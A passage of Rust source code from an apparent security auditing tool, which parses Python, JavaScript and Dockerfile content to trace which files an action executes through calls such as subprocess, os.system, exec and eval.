                        } else {
                            base.clone()
                        };
                        join_location([directory, relative], true)
                    }
                    _ => relative,
                }
            }
            "basename" | "extname" | "relative" => DYNAMIC_VALUE.to_string(),
            "getenv" | "get"
                if (function == "getenv"
                    || object.is_some_and(|object| object.ends_with("environ")))
                    && let Some(location) = arguments.first().and_then(|argument| {
                        self.environment_value(argument.trim_matches(['\'', '"']))
                    }) =>
            {
                location
            }
            // An unrecognized function of a location may return anything
            // derived from it.
            _ if located_receiver.is_some() || self.is_tainted(argument_text) => {
                UNRESOLVED_LOCATION.to_string()
            }
            _ => DYNAMIC_VALUE.to_string(),
        }
    }
}

/// Two or more values separated by a location-independent choice: a
/// conditional's branches or a logical operator's operands.
pub(crate) fn merge_location_values(values: impl IntoIterator<Item = String>) -> String {
    let mut values: Vec<String> = values.into_iter().collect();
    values.sort();
    values.dedup();
    match values.as_slice() {
        [value] => value.clone(),
        _ if values.iter().any(|value| is_location_derived(value)) => {
            UNRESOLVED_LOCATION.to_string()
        }
        _ => DYNAMIC_VALUE.to_string(),
    }
}

/// The values a conditional or logical expression can produce.
fn alternative_values(expression: &str, language: ScriptLanguage) -> Option<Vec<&str>> {
    match language {
        ScriptLanguage::JavaScript => {
            let mut question = None;
            scan_code(expression, language, |index, character, depth| {
                if depth == 0
                    && character == '?'
                    && !expression[index + 1..].starts_with(['.', '?'])
                    && !expression[..index].ends_with('?')
                {
                    question = Some(index);
                    return false;
                }
                true
            });
            if let Some(question) = question {
                let (then, otherwise) = split_operator(&expression[question + 1..], ":", language)?;
                return Some(vec![then, otherwise]);
            }
            ["||", "??", "&&"].iter().find_map(|operator| {
                split_operator(expression, operator, language)
                    .map(|(left, right)| vec![left, right])
            })
        }
        ScriptLanguage::Python => {
            if let Some((then, rest)) = split_operator(expression, "if", language) {
                let (_, otherwise) = split_operator(rest, "else", language)?;
                return Some(vec![then, otherwise]);
            }
            ["or", "and"].iter().find_map(|operator| {
                split_operator(expression, operator, language)
                    .map(|(left, right)| vec![left, right])
            })
        }
    }
}

/// Splits `value` at its first top-level `operator`. A keyword operator must
/// stand between spaces.
fn split_operator<'v>(
    value: &'v str,
    operator: &str,
    language: ScriptLanguage,
) -> Option<(&'v str, &'v str)> {
    let keyword = operator
        .chars()
        .all(|character| character.is_ascii_alphabetic());
    let mut found = None;
    scan_code(value, language, |index, _, depth| {
        if depth == 0
            && value[index..].starts_with(operator)
            && (!keyword
                || value[..index].ends_with(char::is_whitespace)
                    && value[index + operator.len()..].starts_with(char::is_whitespace))
        {
            found = Some(index);
            return false;
        }
        true
    });
    let index = found?;
    Some((&value[..index], &value[index + operator.len()..]))
}

enum ChainHead<'e> {
    Name(&'e str),
    Value(&'e str),
}

enum ChainLink<'e> {
    Member(&'e str),
    Call(&'e str),
    Index(&'e str),
}

/// Splits `expression` into a head and member, call and index links, or
/// returns `None` when it is not a plain postfix chain.
fn parse_chain(
    expression: &str,
    language: ScriptLanguage,
) -> Option<(ChainHead<'_>, Vec<ChainLink<'_>>)> {
    let mut rest = expression.trim();
    if language == ScriptLanguage::JavaScript
        && let Some(constructed) = rest.strip_prefix("new ")
    {
        rest = constructed.trim_start();
    }
    let head = if let Some(name) = leading_identifier(rest) {
        rest = &rest[name.len()..];
        ChainHead::Name(name)
    } else if rest.starts_with(['\'', '"', '`']) {
        let end = literal_end(rest, language)?;
        let head = ChainHead::Value(&rest[..end]);
        rest = &rest[end..];
        head
    } else if rest.starts_with('(') {
        let end = group_end(rest, language)?;
        let head = ChainHead::Value(&rest[1..end]);
        rest = &rest[end + 1..];
        head
    } else {
        return None;
    };
    let mut links = Vec::new();
    loop {
        rest = rest.trim_start();
        if rest.is_empty() {
            break;
        }
        if let Some(member) = rest.strip_prefix("?.").or_else(|| rest.strip_prefix('.')) {
            let member = member.trim_start();
            if member.starts_with(['(', '[']) {
                rest = member;
                continue;
            }
            let name = leading_identifier(member)?;
            links.push(ChainLink::Member(name));
            rest = &member[name.len()..];
        } else if rest.starts_with('(') {
            let end = group_end(rest, language)?;
            links.push(ChainLink::Call(&rest[1..end]));
            rest = &rest[end + 1..];
        } else if rest.starts_with('[') {
            let end = group_end(rest, language)?;
            links.push(ChainLink::Index(&rest[1..end]));
            rest = &rest[end + 1..];
        } else {
            return None;
        }
    }
    Some((head, links))
}

/// Identifiers in `value`'s code and in its template or f-string
/// interpolations, excluding property names and plain string contents.
fn code_identifiers(value: &str, language: ScriptLanguage) -> Vec<&str> {
    let mut names = Vec::new();
    let mut index = 0;
    let mut previous: Option<char> = None;
    // The identifier ending where a literal starts may be its prefix (`f'`).
    let mut adjacent: Option<(usize, usize, bool)> = None;
    while let Some(character) = value[index..].chars().next() {
        if matches!(character, '\'' | '"')
            || character == '`' && language == ScriptLanguage::JavaScript
        {
            let Some(length) = literal_end(&value[index..], language) else {
                break;
            };
            let prefix = adjacent
                .filter(|&(_, end, _)| end == index)
                .filter(|&(start, end, _)| {
                    language == ScriptLanguage::Python
                        && value[start..end]
                            .chars()
                            .all(|character| "rRfFbBuU".contains(character))
                });
            if let Some((_, _, true)) = prefix {
                names.pop();
            }
            let interpolating = character == '`'
                || prefix.is_some_and(|(start, end, _)| value[start..end].contains(['f', 'F']));
            if interpolating {
                let literal = &value[index..index + length];
                let mut position = 0;
                while let Some(open) = literal[position..].find('{') {
                    let start = position + open + 1;
                    if language == ScriptLanguage::Python && literal[start..].starts_with('{') {
                        position = start + 1;
                        continue;
                    }
                    let Some(body) = matching_brace(&literal[start..]) else {
                        break;
                    };
                    names.extend(code_identifiers(&literal[start..start + body], language));
                    position = start + body + 1;
                }
            }
            index += length;
            previous = Some(character);
            adjacent = None;
            continue;
        }
        let continues_word = previous.is_some_and(|previous| {
            previous.is_ascii_alphanumeric() || matches!(previous, '_' | '$')
        });
        if !continues_word && let Some(name) = leading_identifier(&value[index..]) {
            let pushed = previous != Some('.') || value[..index].ends_with("...");
            if pushed {
                names.push(name);
            }
            adjacent = Some((index, index + name.len(), pushed));
            previous = name.chars().last();
            index += name.len();
            continue;
        }
        previous = Some(character);
        index += character.len_utf8();
    }
    names
}

fn is_identifier(value: &str) -> bool {
    leading_identifier(value).is_some_and(|name| name.len() == value.len())
}

/// The identifier `value` starts with.
fn leading_identifier(value: &str) -> Option<&str> {
    let first = value.chars().next()?;
    if !(first.is_ascii_alphabetic() || matches!(first, '_' | '$')) {
        return None;
    }
    let end = value
        .find(|character: char| {
            !(character.is_ascii_alphanumeric() || matches!(character, '_' | '$'))
        })
        .unwrap_or(value.len());
    Some(&value[..end])
}

/// The byte length of the string literal at the start of `value`, including
/// its quotes.
fn literal_end(value: &str, language: ScriptLanguage) -> Option<usize> {
    let quote = value.chars().next()?;
    if !matches!(quote, '\'' | '"' | '`') {
        return None;
    }
    let triple = language == ScriptLanguage::Python
        && quote != '`'
        && value[1..].starts_with([quote, quote])
        && value[2..].starts_with(quote);
    let delimiter_length = if triple { 3 } else { 1 };
    let mut escaped = false;
    let mut index = delimiter_length;
    while let Some(character) = value[index..].chars().next() {
        if escaped {
            escaped = false;
        } else if character == '\\' {
            escaped = true;
        } else if character == quote && (!triple || value[index..].starts_with(&value[..3])) {
            return Some(index + delimiter_length);
        } else if character == '\n' && !triple && quote != '`' {
            return None;
        }
        index += character.len_utf8();
    }
    None
}

/// Visits `value` outside string literals with each byte offset, character
/// and bracket depth. A closing bracket reports the depth after it closes, so
/// an unmatched one is negative. Stops when `visit` returns false or at an
/// unterminated literal.
fn scan_code(
    value: &str,
    language: ScriptLanguage,
    mut visit: impl FnMut(usize, char, isize) -> bool,
) {
    let mut depth = 0isize;
    let mut index = 0;
    while let Some(character) = value[index..].chars().next() {
        if matches!(character, '\'' | '"')
            || character == '`' && language == ScriptLanguage::JavaScript
        {
            let Some(length) = literal_end(&value[index..], language) else {
                return;
            };
            index += length;
            continue;
        }
        if matches!(character, ')' | ']' | '}') {
            depth -= 1;
        }
        if !visit(index, character, depth) {
            return;
        }
        if matches!(character, '(' | '[' | '{') {
            depth += 1;
        }
        index += character.len_utf8();
    }
}

/// The byte offset of the bracket closing the one `value` starts with.
fn group_end(value: &str, language: ScriptLanguage) -> Option<usize> {
    let mut end = None;
    scan_code(value, language, |index, character, depth| {
        if index > 0 && depth == 0 && matches!(character, ')' | ']' | '}') {
            end = Some(index);
            return false;
        }
        true
    });
    end
}

/// The contents of `value` when one bracket pair opening with `open` wraps
/// all of it.
fn enclosed(value: &str, open: char, language: ScriptLanguage) -> Option<&str> {
    if !value.starts_with(open) {
        return None;
    }
    let end = group_end(value, language)?;
    (end == value.len() - 1).then(|| &value[1..end])
}

/// The byte length of the `{...}` body at the start of an interpolation.
fn matching_brace(value: &str) -> Option<usize> {
    let mut depth = 0usize;
    for (index, character) in value.char_indices() {
        match character {
            '{' => depth += 1,
            '}' if depth == 0 => return Some(index),
            '}' => depth -= 1,
            _ => {}
        }
    }
    None
}

/// Splits `value` at top-level `separator`s outside strings and brackets. An
/// operator doubled or followed by `=` is not a separator.
fn split_top_level(value: &str, separator: char, language: ScriptLanguage) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut start = 0;
    let mut previous = None;
    scan_code(value, language, |index, character, depth| {
        let next = value[index + character.len_utf8()..].chars().next();
        if depth == 0
            && character == separator
            && previous != Some(separator)
            && next != Some(separator)
            && next != Some('=')
        {
            parts.push(value[start..index].trim());
            start = index + character.len_utf8();
        }
        previous = Some(character);
        true
    });
    parts.push(value[start..].trim());
    if separator != ',' && parts.iter().any(|part| part.is_empty()) {
        // A unary operator, not a binary one.
        return vec![value.trim()];
    }
    parts
}

/// Python's leading expression: up to a top-level `;`, `,`, comment,
/// unmatched closing bracket, or a line break that does not continue it.
fn python_leading_expression(value: &str) -> &str {
    let mut end = value.len();
    scan_code(value, ScriptLanguage::Python, |index, character, depth| {
        let stop = index > MAX_LOCATION_EXPRESSION_BYTES
            || depth < 0
            || depth == 0 && matches!(character, ';' | ',' | '#')
            || depth == 0
                && character == '\n'
                && !value[..index]
                    .trim_end_matches([' ', '\t', '\r'])
                    .ends_with('\\');
        if stop {
            end = index;
        }
        !stop
    });
    &value[..end]
}

/// Whether `position` in Python source is outside strings and comments on
/// its line.
fn python_in_code(source: &str, position: usize) -> bool {
    let line_start = source[..position].rfind('\n').map_or(0, |index| index + 1);
    let prefix = &source[line_start..position];
    let mut index = 0;
    while let Some(character) = prefix[index..].chars().next() {
        match character {
            '#' => return false,
            '\'' | '"' => match literal_end(&prefix[index..], ScriptLanguage::Python) {
                Some(length) => index += length,
                None => return false,
            },
            _ => index += character.len_utf8(),
        }
    }
    true
}

/// Executions located through `__file__` or the action path, plus modules
/// loaded by name. A `None` module was named dynamically.
/// Python's executions through a location, plus modules loaded by name. A
/// `None` module was named dynamically.
fn python_located_executions(
    content: &str,
    context: &SourceContext,
) -> (Vec<LocatedExecution>, Vec<Option<String>>) {
    let initial = &context.directory;
    let modules = PY_MODULE_LOADER_RE
        .captures_iter(content)
        .map(|captures| {
            captures
                .name("module")
                .map(|module| module.as_str().to_string())
        })
        .collect();
    if *initial == LocatedDirectory::Caller
        && !PYTHON_LOCATION_TOKENS
            .iter()
            .copied()
            .chain(context.environment.iter().map(|(name, _)| name.as_str()))
            .any(|token| content.contains(token))
    {
        return (Vec::new(), modules);
    }
    let bindings = LocationBindings::python(content, &context.environment);
    let mut directories = Vec::new();
    for call in PY_CHDIR_RE.find_iter(content) {
        if python_in_code(content, call.start())
            && let Some(argument) = python_call_arguments(content, call.end() - 1)
        {
            directories.push((
                call.start(),
                LocatedDirectory::from_value(&bindings.evaluate(argument, 0)),
            ));
        }
    }
    let mut executions = Vec::new();
    for call in PY_EXECUTION_CALL_RE.captures_iter(content) {
        let (Some(matched), Some(name)) = (call.get(0), call.name("name")) else {
            continue;
        };
        if !python_in_code(content, matched.start())
            || content[..matched.start()].trim_end().ends_with("def")
        {
            continue;
        }
        let Some(arguments) = python_call_arguments(content, matched.end() - 1) else {
            continue;
        };
        let default_directory = directories
            .iter()
            .rev()
            .find(|(position, _)| *position < matched.start())
            .map_or_else(|| initial.clone(), |(_, directory)| directory.clone());
        if default_directory == LocatedDirectory::Caller && !bindings.is_tainted(arguments) {
            continue;
        }
        let mut positional = Vec::new();
        let mut keywords = HashMap::new();
        for argument in python_top_level_arguments(arguments) {
            match argument.split_once('=') {
                Some((keyword, value)) if PY_KEYWORD_ARGUMENT_RE.is_match(argument) => {
                    keywords.insert(keyword.trim(), value.trim());
                }
                _ => positional.push(argument),
            }
        }
        let directory = keywords.get("cwd").map_or(default_directory, |cwd| {
            LocatedDirectory::from_value(&bindings.evaluate(cwd, 0))
        });
        let python_file = |expression: Option<&&str>, executions: &mut Vec<LocatedExecution>| {
            let Some(expression) = expression else {
                return;
            };
            let value = bindings.evaluate(expression, 0);
            if is_location_derived(&value) {
                executions.push(LocatedExecution::of(&value, SourceFileKind::Python));
            }
        };
        let scan = ShellScan {
            depth: 0,
            composite: false,
        };
        let words: Vec<String> = match name.as_str() {
            "system" | "popen" | "getoutput" | "getstatusoutput" => {
                if let Some(command) = positional.first() {
                    shell_script_executions(
                        &bindings.evaluate(command, 0),
                        false,
                        scan,
                        ShellLocationState::starting_in(directory),
                        &mut executions,
                    );
                }
                continue;
            }
            "run" | "call" | "check_call" | "check_output" | "Popen" => {
                let Some(argv) = keywords.get("args").or(positional.first()) else {
                    continue;
                };
                if keywords.get("shell").is_some_and(|shell| *shell == "True") {
                    shell_script_executions(
                        &bindings.evaluate(argv, 0),
                        false,
                        scan,
                        ShellLocationState::starting_in(directory),
                        &mut executions,
                    );
                    continue;
                }
                let mut words = bindings.evaluate_words(argv, 0);
                if let Some(executable) = keywords.get("executable") {
                    let program = bindings.evaluate(executable, 0);
                    match words.first_mut() {
                        Some(first) => *first = program,
                        None => words.push(program),
                    }
                }
                words
            }
            "run_path" => {
                python_file(positional.first(), &mut executions);
                continue;
            }
            "load_source" | "spec_from_file_location" => {
                python_file(
                    keywords
                        .get("location")
                        .or(keywords.get("pathname"))
                        .or(positional.get(1)),
                    &mut executions,
                );
                continue;
            }
            "exec" => {
                let source = positional.first().copied().unwrap_or_default();
                match source.find("open(") {
                    Some(open) => python_file(
                        python_call_arguments(source, open + 4)
                            .map(|arguments| {
                                python_top_level_arguments(arguments)
                                    .first()
                                    .copied()
                                    .unwrap_or_default()
                            })
                            .as_ref(),
                        &mut executions,
                    ),
                    None if bindings.is_tainted(source) => {
                        executions.push(LocatedExecution::unresolved(SourceFileKind::Python));
                    }
                    None => {}
                }
                continue;
            }
            name if name.starts_with("spawn") => {
                let mut words: Vec<String> = positional
                    .get(1)
                    .map(|path| bindings.evaluate(path, 0))
                    .into_iter()
                    .collect();
                if name.contains('v') {
                    words.extend(
                        positional
                            .get(2)
                            .map(|argv| bindings.evaluate_words(argv, 0))
                            .unwrap_or_default()
                            .into_iter()
                            .skip(1),
                    );
                } else {
                    words.extend(
                        positional
                            .iter()
                            .skip(3)
                            .map(|argument| bindings.evaluate(argument, 0)),
                    );
                }
                words
            }
            name => {
                // exec*, posix_spawn*: the program path, then its argv.
                let mut words: Vec<String> = positional
                    .first()
                    .map(|path| bindings.evaluate(path, 0))
                    .into_iter()
                    .collect();
                if name.contains('v') || name.starts_with("posix_spawn") {
                    words.extend(
                        positional
                            .get(1)
                            .map(|argv| bindings.evaluate_words(argv, 0))
                            .unwrap_or_default()
                            .into_iter()
                            .skip(1),
                    );
                } else {
                    words.extend(
                        positional
                            .iter()
                            .skip(2)
                            .map(|argument| bindings.evaluate(argument, 0)),
                    );
                }
                words
            }
        };
        command_located_executions(&words, &directory, scan, &mut executions);
    }
    (executions, modules)
}

fn python_call_arguments(content: &str, open: usize) -> Option<&str> {
    let mut depth = 0usize;
    let mut quote = None;
    let mut escaped = false;
    for (offset, character) in content[open..].char_indices() {
        if let Some(active) = quote {
            if escaped {
                escaped = false;
            } else if character == '\\' {
                escaped = true;
            } else if character == active {
                quote = None;
            }
            continue;
        }
        match character {
            '\'' | '"' => quote = Some(character),
            '(' | '[' | '{' => depth += 1,
            ')' | ']' | '}' => {
                depth = depth.checked_sub(1)?;
                if depth == 0 {
                    return Some(&content[open + 1..open + offset]);
                }
            }
            _ => {}
        }
    }
    None
}

fn python_top_level_arguments(arguments: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let mut depth = 0usize;
    let mut quote = None;
    let mut escaped = false;
    let mut start = 0;
    for (index, character) in arguments.char_indices() {
        if let Some(active) = quote {
            if escaped {
                escaped = false;
            } else if character == '\\' {
                escaped = true;
            } else if character == active {
                quote = None;
            }
            continue;
        }
        match character {
            '\'' | '"' => quote = Some(character),
            '(' | '[' | '{' => depth += 1,
            ')' | ']' | '}' => depth = depth.saturating_sub(1),
            ',' if depth == 0 => {
                parts.push(arguments[start..index].trim());
                start = index + 1;
            }
            _ => {}
        }
    }
    parts.push(arguments[start..].trim());
    parts.retain(|part| !part.is_empty());
    parts
}

fn exact_javascript_loader_specifier(argument: &str) -> Option<&str> {
    let quote = argument.chars().next()?;
    if !matches!(quote, '\'' | '"' | '`') {
        return None;
    }
    let body = &argument[quote.len_utf8()..];
    let end = body.rfind(quote)?;
    if !body[end + quote.len_utf8()..].trim().is_empty()
        || quote == '`' && body[..end].contains("${")
    {
        return None;
    }
    Some(&body[..end])
}

fn executed_javascript_string_literals<'a>(
    code: &'a str,
    quotes: &crate::audit::JavaScriptQuoteIndex,
) -> (Vec<&'a str>, bool) {
    let mut literals = Vec::new();
    let mut complete = true;
    let delimiter_index = std::cell::OnceCell::new();
    let delimiters =
        || delimiter_index.get_or_init(|| crate::audit::JavaScriptDelimiterIndex::new(code));
    for marker in ["eval", "Function", "setTimeout", "setInterval"] {
        for (index, _) in code.match_indices(marker) {
            let before = code[..index].chars().next_back();
            let after = code[index + marker.len()..].chars().next();
            if quotes.is_quoted(index)
                || before.is_some_and(|character| {
                    character == '_' || character == '$' || character.is_ascii_alphanumeric()
                })
                || after.is_some_and(|character| {
                    character == '_' || character == '$' || character.is_ascii_alphanumeric()
                })
            {
                continue;
            }
            let remaining = code[index + marker.len()..].trim_start();
            let mut method_call = false;
            let mut bound_argument = None;
            let mut call_like = remaining.starts_with('(') || remaining.starts_with("?.(");
            let call = if remaining.starts_with('(') {
                Some(remaining)
            } else if let Some(optional) = remaining.strip_prefix("?.") {
                let optional = optional.trim_start();
                if optional.starts_with('(') {
                    Some(optional)
                } else if optional.starts_with('[') {
                    if matches!(marker, "eval" | "Function") {
                        complete = false;
                    }
                    continue;
                } else if let Some(call_tail) = optional.strip_prefix("call") {
                    method_call = true;
                    call_like = true;
                    Some(call_tail.trim_start())
                } else if optional.starts_with("apply") {
                    complete = false;
                    continue;
                } else if let Some(bind_tail) = optional.strip_prefix("bind") {
                    match immediate_bound_javascript_argument(marker, bind_tail, delimiters()) {
                        Ok(Some(argument)) => bound_argument = Some(argument),
                        Ok(None) if marker == "eval" => complete = false,
                        Ok(None) => {}
                        Err(()) => complete = false,
                    }
                    None
                } else {
                    if matches!(marker, "eval" | "Function")
                        && has_escaped_javascript_method_call(optional)
                    {
                        complete = false;
                    }
                    None
                }
            } else if remaining.starts_with('[') {
                if matches!(marker, "eval" | "Function") {
                    complete = false;
                }
                continue;
            } else if let Some(call_tail) = remaining.strip_prefix(".call") {
                method_call = true;
                call_like = true;
                Some(call_tail.trim_start())
            } else if remaining.starts_with(".apply") {
                complete = false;
                continue;
            } else if let Some(bind_tail) = remaining.strip_prefix(".bind") {
                match immediate_bound_javascript_argument(marker, bind_tail, delimiters()) {
                    Ok(Some(argument)) => bound_argument = Some(argument),
                    Ok(None) if marker == "eval" => complete = false,
                    Ok(None) => {}
                    Err(()) => complete = false,
                }
                None
            } else if matches!(marker, "eval" | "Function")
                && remaining.starts_with('.')
                && has_escaped_javascript_method_call(remaining)
            {
                complete = false;
                continue;
            } else {
                let mut tail = remaining;
                let mut closing_parentheses = 0;
                while let Some(after_close) = tail.strip_prefix(')') {
                    closing_parentheses += 1;
                    tail = after_close.trim_start();
                }
                if closing_parentheses > 0 {
                    let optional_tail = tail.strip_prefix("?.").map(str::trim_start);
                    tail = optional_tail.unwrap_or(tail);
                    if tail.starts_with('(') {
                        call_like = true;
                        Some(tail)
                    } else if tail.starts_with('[') {
                        if matches!(marker, "eval" | "Function") {
                            complete = false;
                        }
                        None
                    } else if let Some(call_tail) = tail.strip_prefix(".call").or_else(|| {
                        optional_tail.and_then(|optional| optional.strip_prefix("call"))
                    }) {
                        method_call = true;
                        call_like = true;
                        Some(call_tail.trim_start())
                    } else if tail.starts_with(".apply")
                        || optional_tail.is_some_and(|optional| optional.starts_with("apply"))
                    {
                        complete = false;
                        None
                    } else if let Some(bind_tail) = tail.strip_prefix(".bind").or_else(|| {
                        optional_tail.and_then(|optional| optional.strip_prefix("bind"))
                    }) {
                        match immediate_bound_javascript_argument(marker, bind_tail, delimiters()) {
                            Ok(Some(argument)) => bound_argument = Some(argument),
                            Ok(None) if marker == "eval" => complete = false,
                            Ok(None) => {}
                            Err(()) => complete = false,
                        }
                        None
                    } else {
                        if matches!(marker, "eval" | "Function")
                            && has_escaped_javascript_method_call(tail)
                        {
                            complete = false;
                        }
                        None
                    }
                } else {
                    None
                }
            };
            let argument = if bound_argument.is_some() {
                bound_argument
            } else if let Some((arguments, _)) = call.and_then(|call| delimiters().call_parts(call))
            {
                let arguments = delimiters().arguments(arguments);
                if marker == "Function" {
                    arguments.last().copied()
                } else if method_call {
                    arguments.get(1).copied()
                } else {
                    arguments.first().copied()
                }
            } else {
                if call_like && matches!(marker, "eval" | "Function") {
                    complete = false;
                }
                continue;
            };
            let Some(argument) = argument else {
                continue;
            };
            let string_argument = argument
                .trim_start()
                .chars()
                .next()
                .is_some_and(|character| matches!(character, '\'' | '"' | '`'));
            let Some(literal) = exact_javascript_string_literal(argument) else {
                if matches!(marker, "eval" | "Function") || string_argument {
                    complete = false;
                }
                continue;
            };
            if literal.contains('\\') {
                complete = false;
            } else {
                literals.push(literal);
            }
        }
    }
    (literals, complete)
}

fn has_escaped_javascript_method_call(value: &str) -> bool {
    value
        .split_once('(')
        .is_some_and(|(property, _)| property.contains('\\'))
}

fn immediate_bound_javascript_argument<'a>(
    marker: &str,
    bind_tail: &'a str,
    delimiters: &crate::audit::JavaScriptDelimiterIndex<'a>,
) -> Result<Option<&'a str>, ()> {
    if !bind_tail.trim_start().starts_with('(') {
        return Ok(None);
    }
    let Some((bound, after_bind)) = delimiters.call_parts(bind_tail) else {
        return Err(());
    };
    let after_bind = after_bind.trim_start();
    let invocation = after_bind.strip_prefix("?.").unwrap_or(after_bind);
    let Some((invoked, _)) = delimiters.call_parts(invocation) else {
        return Ok(None);
    };
    let bound = delimiters.arguments(bound);
    let invoked = delimiters.arguments(invoked);
    Ok(if marker == "Function" {
        invoked.last().copied().or_else(|| {
            bound
                .get(1..)
                .and_then(|arguments| arguments.last().copied())
        })
    } else {
        bound.get(1).copied().or_else(|| invoked.first().copied())
    })
}

#[cfg(test)]
fn javascript_call_parts(value: &str) -> Option<(&str, &str)> {
    let value = value.trim_start();
    let body = value.strip_prefix('(')?;
    let mut depth = 1usize;
    let mut quote = None;
    let mut escaped = false;
    for (index, character) in body.char_indices() {
        if escaped {
            escaped = false;
        } else if quote.is_some() && character == '\\' {
            escaped = true;
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
        } else if quote.is_none() {
            match character {
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some((&body[..index], &body[index + 1..]));
                    }
                }
                _ => {}
            }
        }
    }
    None
}

#[cfg(test)]
fn split_javascript_arguments(arguments: &str) -> Vec<&str> {
    let mut result = Vec::new();
    let mut start = 0usize;
    let mut depth = 0usize;
    let mut quote = None;
    let mut escaped = false;
    for (index, character) in arguments.char_indices() {
        if escaped {
            escaped = false;
        } else if quote.is_some() && character == '\\' {
            escaped = true;
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
        } else if quote.is_none() {
            match character {
                '(' | '[' | '{' => depth += 1,
                ')' | ']' | '}' => depth = depth.saturating_sub(1),
                ',' if depth == 0 => {
                    result.push(arguments[start..index].trim());
                    start = index + 1;
                }
                _ => {}
            }
        }
    }
    let argument = arguments[start..].trim();
    if !argument.is_empty() {
        result.push(argument);
    }
    result
}

fn exact_javascript_string_literal(value: &str) -> Option<&str> {
    let value = value.trim();
    let quote = value
        .chars()
        .next()
        .filter(|quote| matches!(quote, '\'' | '"' | '`'))?;
    let body = &value[quote.len_utf8()..];
    let mut escaped = false;
    for (end, character) in body.char_indices() {
        if escaped {
            escaped = false;
        } else if character == '\\' {
            escaped = true;
        } else if character == quote {
            let literal = &body[..end];
            let trailing = body[end + quote.len_utf8()..].trim();
            if trailing.is_empty() && !(quote == '`' && literal.contains("${")) {
                return Some(literal);
            }
            return None;
        }
    }
    None
}

fn include_remote_javascript_dependency(
    available: &HashSet<&str>,
    targets: &mut Vec<(String, SourceFileKind)>,
    source: &str,
    dependency: &str,
) -> bool {
    let Some(path) = normalize_action_entrypoint_path(path_parent(source), dependency) else {
        return false;
    };
    if available.contains(path.as_str()) {
        if let Some(kind) = executable_source_kind(&path) {
            push_unique_source_target(targets, path, kind);
        } else if Path::new(&path).extension().is_none() {
            push_unique_source_target(targets, path, SourceFileKind::JavaScript);
        } else if !is_nonexecutable_data_path(&path) {
            return false;
        }
        return true;
    }
    if Path::new(&path).extension().is_some() {
        return false;
    }
    ["js", "mjs", "cjs", "ts"]
        .into_iter()
        .map(|extension| format!("{path}.{extension}"))
        .chain(
            ["js", "mjs", "cjs", "ts"]
                .into_iter()
                .map(|extension| format!("{path}/index.{extension}")),
        )
        .find(|candidate| available.contains(candidate.as_str()))
        .is_some_and(|candidate| {
            push_unique_source_target(targets, candidate, SourceFileKind::JavaScript);
            true
        })
}

fn is_nonexecutable_data_path(path: &str) -> bool {
    Path::new(path)
        .extension()
        .and_then(|extension| extension.to_str())
        .is_some_and(|extension| {
            matches!(
                extension.to_ascii_lowercase().as_str(),
                "json"
                    | "jsonl"
                    | "ndjson"
                    | "yaml"
                    | "yml"
                    | "toml"
                    | "csv"
                    | "tsv"
                    | "xml"
                    | "txt"
                    | "md"
                    | "rst"
            )
        })
}

fn include_remote_python_dependency(
    available: &HashSet<&str>,
    targets: &mut Vec<(String, SourceFileKind)>,
    source: &str,
    module: &str,
    roots: &[String],
) -> bool {
    let parent_levels = module
        .chars()
        .take_while(|character| *character == '.')
        .count();
    let module = module[parent_levels..].replace('.', "/");
    let mut relative = "../".repeat(parent_levels.saturating_sub(1));
    relative.push_str(if module.is_empty() { "." } else { &module });
    let bases: Vec<&str> = if parent_levels > 0 {
        vec![path_parent(source)]
    } else {
        std::iter::once(path_parent(source))
            .chain(roots.iter().map(String::as_str))
            .collect()
    };
    let mut found = false;
    for base in bases {
        found |= include_python_module_at(available, targets, base, &relative, &module);
    }
    found
}

fn include_python_module_at(
    available: &HashSet<&str>,
    targets: &mut Vec<(String, SourceFileKind)>,
    base: &str,
    relative: &str,
    module: &str,
) -> bool {
    let Some(path) = normalize_action_entrypoint_path(base, relative) else {
        return false;
    };
    let mut prefix = path.clone();
    for _ in module.split('/').skip(1) {
        prefix = path_parent(&prefix).to_string();
        let initializer = format!("{prefix}/__init__.py");
        if available.contains(initializer.as_str()) {
            push_unique_source_target(targets, initializer, SourceFileKind::Python);
        }
    }
    [format!("{path}/__init__.py"), format!("{path}.py")]
        .into_iter()
        .find(|candidate| available.contains(candidate.as_str()))
        .is_some_and(|candidate| {
            push_unique_source_target(targets, candidate, SourceFileKind::Python);
            true
        })
}

fn include_remote_exact_dependency(
    available: &HashSet<&str>,
    targets: &mut Vec<(String, SourceFileKind)>,
    base: &str,
    dependency: &str,
    kind: SourceFileKind,
) -> bool {
    let Some(path) = normalize_action_entrypoint_path(base, dependency) else {
        return false;
    };
    if !available.contains(path.as_str()) {
        return false;
    }
    push_unique_source_target(targets, path, kind);
    true
}

fn include_remote_docker_dependency(
    available: &HashSet<&str>,
    tree_complete: bool,
    targets: &mut Vec<(String, SourceFileKind)>,
    action_base: &str,
    source: &str,
) -> bool {
    if crate::audit_patterns::is_http_url(source) {
        return true;
    }
    if source.contains(['$', '`']) {
        return false;
    }
    let normalized = if source == "." {
        Some(action_base.to_string())
    } else {
        normalize_action_entrypoint_path(action_base, source)
    };
    let Some(path) = normalized else {
        return false;
    };

    if path.contains(['*', '?', '[']) {
        let mut matched = false;
        for candidate in available {
            if wildcard_path_matches(&path, candidate) {
                matched = true;
                if let Some(kind) = executable_source_kind(candidate) {
                    push_unique_source_target(targets, (*candidate).to_string(), kind);
                }
            }
        }
        return matched && tree_complete;
    }
    if available.contains(path.as_str()) {
        if let Some(kind) = executable_source_kind(&path) {
            push_unique_source_target(targets, path, kind);
        }
        return true;
    }

    let prefix = if path.is_empty() {
        String::new()
    } else {
        format!("{path}/")
    };
    let mut matched = false;
    for candidate in available {
        if candidate.starts_with(&prefix) {
            matched = true;
            if let Some(kind) = executable_source_kind(candidate) {
                push_unique_source_target(targets, (*candidate).to_string(), kind);
            }
        }
    }
    matched && tree_complete
}

/// Action files a container image runs through `ENTRYPOINT`, `CMD` or
/// `RUN`, found by mapping image paths back to what `COPY` or `ADD` put
/// there. Each is scanned as the interpreter that runs it, whatever its
/// name.
fn dockerfile_located_executions(
    content: &str,
    available: &HashSet<&str>,
    action_base: &str,
) -> Vec<LocatedExecution> {
    let mut copies: Vec<(String, String)> = Vec::new();
    let mut workdir = "/".to_string();
    let mut entrypoint: Option<Vec<String>> = None;
    let mut command: Option<Vec<String>> = None;
